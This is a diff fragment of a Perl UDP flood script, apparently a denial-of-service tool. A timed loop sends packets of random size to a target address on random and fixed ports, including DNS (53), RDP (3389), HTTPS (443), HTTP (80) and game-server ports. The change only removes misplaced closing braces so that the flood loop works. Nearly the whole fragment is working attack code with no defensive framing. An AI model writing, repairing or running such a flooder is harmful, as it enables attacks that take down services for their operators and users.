@@ -27,10 +27,10 @@ for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(900-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
  
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("53", $iaddr));}
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("3389", $iaddr));}
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("443", $iaddr));}
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("80", $iaddr));}
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("17091", $iaddr));}
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("53", $iaddr));
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("3389", $iaddr));
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("443", $iaddr));
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("80", $iaddr));
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("17091", $iaddr));
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("19132", $iaddr));}
